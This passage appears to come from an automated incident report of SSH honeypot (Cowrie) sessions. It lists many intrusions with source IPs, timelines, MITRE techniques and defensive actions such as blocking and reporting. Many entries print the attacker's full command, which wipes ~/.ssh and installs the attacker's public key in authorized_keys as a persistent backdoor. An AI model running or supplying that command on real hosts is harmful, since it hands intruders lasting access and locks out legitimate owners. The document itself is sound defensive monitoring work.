| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:55:31` | `cowrie.session.connect` |
| `2026-06-15 05:55:31` | `cowrie.client.version` |
| `2026-06-15 05:55:31` | `cowrie.client.kex` |
| `2026-06-15 05:55:31` | `cowrie.login.success` |
| `2026-06-15 05:55:31` | `cowrie.session.params` |
| `2026-06-15 05:55:31` | `cowrie.command.input` |
| `2026-06-15 05:55:31` | `cowrie.command.failed` |
| `2026-06-15 05:55:32` | `cowrie.log.closed` |
| `2026-06-15 05:55:32` | `cowrie.session.params` |
| `2026-06-15 05:55:32` | `cowrie.command.input` |
| `2026-06-15 05:55:32` | `cowrie.session.file_download` |
| `2026-06-15 05:55:32` | `cowrie.log.closed` |
| `2026-06-15 05:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def4562fbff8

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]2` |
| **First Seen** | 2026-06-15 05:55 |
| **Last Seen** | 2026-06-15 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:55:33` | `cowrie.session.connect` |
| `2026-06-15 05:55:33` | `cowrie.client.version` |
| `2026-06-15 05:55:34` | `cowrie.client.kex` |
| `2026-06-15 05:55:34` | `cowrie.login.success` |
| `2026-06-15 05:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0428013aa7d6

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]2` |
| **First Seen** | 2026-06-15 05:58 |
| **Last Seen** | 2026-06-15 05:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:58:11` | `cowrie.session.connect` |
| `2026-06-15 05:58:11` | `cowrie.client.version` |
| `2026-06-15 05:58:11` | `cowrie.client.kex` |
| `2026-06-15 05:58:12` | `cowrie.login.success` |
| `2026-06-15 05:58:12` | `cowrie.session.params` |
| `2026-06-15 05:58:12` | `cowrie.command.input` |
| `2026-06-15 05:58:12` | `cowrie.command.failed` |
| `2026-06-15 05:58:12` | `cowrie.log.closed` |
| `2026-06-15 05:58:12` | `cowrie.session.params` |
| `2026-06-15 05:58:12` | `cowrie.command.input` |
| `2026-06-15 05:58:12` | `cowrie.session.file_download` |
| `2026-06-15 05:58:12` | `cowrie.log.closed` |
| `2026-06-15 05:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc9a9b787440

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]0` |
| **First Seen** | 2026-06-15 05:58 |
| **Last Seen** | 2026-06-15 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 05:58:14` | `cowrie.session.connect` |
| `2026-06-15 05:58:14` | `cowrie.client.version` |
| `2026-06-15 05:58:14` | `cowrie.client.kex` |
| `2026-06-15 05:58:14` | `cowrie.login.success` |
| `2026-06-15 05:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]0` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b12a2ee94b

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 06:00 |
| **Last Seen** | 2026-06-15 06:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 06:00:47` | `cowrie.session.connect` |
| `2026-06-15 06:00:47` | `cowrie.client.version` |
| `2026-06-15 06:00:47` | `cowrie.client.kex` |
| `2026-06-15 06:00:48` | `cowrie.login.success` |
| `2026-06-15 06:00:48` | `cowrie.session.params` |
| `2026-06-15 06:00:48` | `cowrie.command.input` |
| `2026-06-15 06:00:48` | `cowrie.command.failed` |
| `2026-06-15 06:00:48` | `cowrie.log.closed` |
| `2026-06-15 06:00:48` | `cowrie.session.params` |
| `2026-06-15 06:00:48` | `cowrie.command.input` |
| `2026-06-15 06:00:48` | `cowrie.session.file_download` |
| `2026-06-15 06:00:48` | `cowrie.log.closed` |
| `2026-06-15 06:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee6ae157caf2

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 06:00 |
| **Last Seen** | 2026-06-15 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 06:00:56` | `cowrie.session.connect` |
| `2026-06-15 06:00:56` | `cowrie.client.version` |
| `2026-06-15 06:00:56` | `cowrie.client.kex` |
| `2026-06-15 06:00:57` | `cowrie.login.success` |
| `2026-06-15 06:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31de7d71089a

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-06-15 06:05 |
| **Last Seen** | 2026-06-15 06:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 06:05:33` | `cowrie.session.connect` |
| `2026-06-15 06:05:33` | `cowrie.client.version` |
| `2026-06-15 06:05:33` | `cowrie.client.kex` |
| `2026-06-15 06:05:33` | `cowrie.login.success` |
| `2026-06-15 06:05:33` | `cowrie.session.params` |
| `2026-06-15 06:05:33` | `cowrie.command.input` |
| `2026-06-15 06:05:33` | `cowrie.command.failed` |
| `2026-06-15 06:05:34` | `cowrie.log.closed` |
| `2026-06-15 06:05:34` | `cowrie.session.params` |
| `2026-06-15 06:05:34` | `cowrie.command.input` |
| `2026-06-15 06:05:34` | `cowrie.session.file_download` |
| `2026-06-15 06:05:34` | `cowrie.log.closed` |
| `2026-06-15 06:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bfff4b95689

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]2` |
| **First Seen** | 2026-06-15 06:05 |
| **Last Seen** | 2026-06-15 06:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 06:05:35` | `cowrie.session.connect` |
| `2026-06-15 06:05:35` | `cowrie.client.version` |
| `2026-06-15 06:05:35` | `cowrie.client.kex` |
| `2026-06-15 06:05:36` | `cowrie.login.success` |
| `2026-06-15 06:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68657656c23

| Field | Detail |
|---|---|
| **Source IP** | `167.99.148[.]102` |
| **First Seen** | 2026-06-15 06:55 |
| **Last Seen** | 2026-06-15 06:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 06:55:51` | `cowrie.session.connect` |
| `2026-06-15 06:55:51` | `cowrie.client.version` |
| `2026-06-15 06:55:51` | `cowrie.client.kex` |
| `2026-06-15 06:55:52` | `cowrie.login.success` |
| `2026-06-15 06:55:53` | `cowrie.session.params` |
| `2026-06-15 06:55:53` | `cowrie.command.input` |
| `2026-06-15 06:55:53` | `cowrie.command.failed` |
| `2026-06-15 06:55:53` | `cowrie.log.closed` |
| `2026-06-15 06:55:53` | `cowrie.session.params` |
| `2026-06-15 06:55:53` | `cowrie.command.input` |
| `2026-06-15 06:55:54` | `cowrie.session.file_download` |
| `2026-06-15 06:55:54` | `cowrie.log.closed` |
| `2026-06-15 06:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.148[.]102` to AbuseIPDB if not already reported
- [ ] Block `167.99.148[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6ebbe32d8f

| Field | Detail |
|---|---|
| **Source IP** | `167.99.148[.]102` |
| **First Seen** | 2026-06-15 06:55 |
| **Last Seen** | 2026-06-15 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 06:55:56` | `cowrie.session.connect` |
| `2026-06-15 06:55:56` | `cowrie.client.version` |
| `2026-06-15 06:55:57` | `cowrie.client.kex` |
| `2026-06-15 06:55:57` | `cowrie.login.success` |
| `2026-06-15 06:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.148[.]102` to AbuseIPDB if not already reported
- [ ] Block `167.99.148[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a01d20f81a4

| Field | Detail |
|---|---|
| **Source IP** | `219.128.75[.]174` |
| **First Seen** | 2026-06-15 07:28 |
| **Last Seen** | 2026-06-15 07:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:28:07` | `cowrie.session.connect` |
| `2026-06-15 07:28:07` | `cowrie.client.version` |
| `2026-06-15 07:28:07` | `cowrie.client.kex` |
| `2026-06-15 07:28:08` | `cowrie.login.success` |
| `2026-06-15 07:28:08` | `cowrie.session.params` |
| `2026-06-15 07:28:08` | `cowrie.command.input` |
| `2026-06-15 07:28:08` | `cowrie.command.failed` |
| `2026-06-15 07:28:08` | `cowrie.log.closed` |
| `2026-06-15 07:28:08` | `cowrie.session.params` |
| `2026-06-15 07:28:08` | `cowrie.command.input` |
| `2026-06-15 07:28:09` | `cowrie.session.file_download` |
| `2026-06-15 07:28:09` | `cowrie.log.closed` |
| `2026-06-15 07:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.75[.]174` to AbuseIPDB if not already reported
- [ ] Block `219.128.75[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebad3f123a9

| Field | Detail |
|---|---|
| **Source IP** | `219.128.75[.]174` |
| **First Seen** | 2026-06-15 07:28 |
| **Last Seen** | 2026-06-15 07:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:28:10` | `cowrie.session.connect` |
| `2026-06-15 07:28:10` | `cowrie.client.version` |
| `2026-06-15 07:28:10` | `cowrie.client.kex` |
| `2026-06-15 07:28:11` | `cowrie.login.success` |
| `2026-06-15 07:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.75[.]174` to AbuseIPDB if not already reported
- [ ] Block `219.128.75[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d608ed4e596

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-15 07:35 |
| **Last Seen** | 2026-06-15 07:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:35:09` | `cowrie.session.connect` |
| `2026-06-15 07:35:09` | `cowrie.client.version` |
| `2026-06-15 07:35:10` | `cowrie.client.kex` |
| `2026-06-15 07:35:10` | `cowrie.login.success` |
| `2026-06-15 07:35:11` | `cowrie.session.params` |
| `2026-06-15 07:35:11` | `cowrie.command.input` |
| `2026-06-15 07:35:11` | `cowrie.command.failed` |
| `2026-06-15 07:35:11` | `cowrie.log.closed` |
| `2026-06-15 07:35:11` | `cowrie.session.params` |
| `2026-06-15 07:35:11` | `cowrie.command.input` |
| `2026-06-15 07:35:12` | `cowrie.session.file_download` |
| `2026-06-15 07:35:12` | `cowrie.log.closed` |
| `2026-06-15 07:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a057b889c8

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-15 07:35 |
| **Last Seen** | 2026-06-15 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:35:14` | `cowrie.session.connect` |
| `2026-06-15 07:35:14` | `cowrie.client.version` |
| `2026-06-15 07:35:14` | `cowrie.client.kex` |
| `2026-06-15 07:35:15` | `cowrie.login.success` |
| `2026-06-15 07:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c319664606

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:50 |
| **Last Seen** | 2026-06-15 07:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:50:47` | `cowrie.session.connect` |
| `2026-06-15 07:50:47` | `cowrie.client.version` |
| `2026-06-15 07:50:48` | `cowrie.client.kex` |
| `2026-06-15 07:50:48` | `cowrie.login.success` |
| `2026-06-15 07:50:49` | `cowrie.session.params` |
| `2026-06-15 07:50:49` | `cowrie.command.input` |
| `2026-06-15 07:50:49` | `cowrie.command.failed` |
| `2026-06-15 07:50:49` | `cowrie.log.closed` |
| `2026-06-15 07:50:49` | `cowrie.session.params` |
| `2026-06-15 07:50:49` | `cowrie.command.input` |
| `2026-06-15 07:50:49` | `cowrie.session.file_download` |
| `2026-06-15 07:50:49` | `cowrie.log.closed` |
| `2026-06-15 07:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9779d1bc7c

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:50 |
| **Last Seen** | 2026-06-15 07:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:50:51` | `cowrie.session.connect` |
| `2026-06-15 07:50:51` | `cowrie.client.version` |
| `2026-06-15 07:50:51` | `cowrie.client.kex` |
| `2026-06-15 07:50:51` | `cowrie.login.success` |
| `2026-06-15 07:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8238315b30d8

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:54 |
| **Last Seen** | 2026-06-15 07:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:54:58` | `cowrie.session.connect` |
| `2026-06-15 07:54:58` | `cowrie.client.version` |
| `2026-06-15 07:54:58` | `cowrie.client.kex` |
| `2026-06-15 07:54:59` | `cowrie.login.success` |
| `2026-06-15 07:54:59` | `cowrie.session.params` |
| `2026-06-15 07:54:59` | `cowrie.command.input` |
| `2026-06-15 07:54:59` | `cowrie.command.failed` |
| `2026-06-15 07:54:59` | `cowrie.log.closed` |
| `2026-06-15 07:55:00` | `cowrie.session.params` |
| `2026-06-15 07:55:00` | `cowrie.command.input` |
| `2026-06-15 07:55:00` | `cowrie.session.file_download` |
| `2026-06-15 07:55:00` | `cowrie.log.closed` |
| `2026-06-15 07:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a119b377edeb

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:55 |
| **Last Seen** | 2026-06-15 07:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:55:02` | `cowrie.session.connect` |
